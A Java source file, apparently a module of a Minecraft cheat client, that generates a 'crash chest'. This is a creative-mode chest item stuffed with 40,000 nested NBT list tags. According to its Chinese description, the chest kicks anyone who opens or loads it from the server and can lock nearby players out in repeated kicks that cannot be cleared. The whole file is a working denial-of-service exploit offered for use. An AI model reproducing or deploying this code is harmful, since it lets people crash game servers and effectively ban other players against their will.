package lexis.Hack.Hacks.Items;

import lexis.Hack.Hack;
import lexis.Hack.Hackutil.NotificationManager;
import lexis.Hack.Hackutil.config.HackConfig;
import lexis.item.Utils;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.chat.Component;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.level.block.Blocks;

public class CrashChestHack extends Hack {
   private HackConfig config = HackConfig.getInstance();

   public CrashChestHack() {
      super("崩房箱子", new String[]{"生成崩房箱子", "复制自己背包更多箱子，已加载的区块最近玩家可能会封禁了", "如果这箱子复制出来，放在箱子里，打开箱子会被踢出服务器！（只需放多少个？）", "§c§l警告：无法清除，进入服务器可能会被循环踢出已加载的区块最近玩家里（封禁已加载的区块最近玩家一样）"}, Hack.Category.ITEMS, false);
   }

   public void onEnable() {
   }

   public void onDisable() {
   }

   public void onUpdate() {
   }

   public void onClick() {
      if (mc.f_91074_ != null && mc.f_91074_.m_150110_().f_35937_) {
         ItemStack stack = new ItemStack(Blocks.f_50087_, 64);
         CompoundTag nbt = new CompoundTag();
         ListTag list = new ListTag();

         for(int i = 0; i < 40000; ++i) {
            list.add(new ListTag());
         }

         nbt.m_128365_("ʷʷʷ.ʰᵘᵃʰᵘᵒˢʰᵉⁿ.ᶜᵒᵐxLexis", list);
         stack.m_41751_(nbt);
         stack.m_41714_(Component.m_237113_("复制的我！"));
         boolean added = Utils.addItem(stack);
         if (!added) {
            NotificationManager.info("崩房箱子：", "已给予 崩房箱子！", 3);
         }

      } else {
         NotificationManager.error("崩房箱子", "你需要是创造模式！", 3);
      }
   }
}
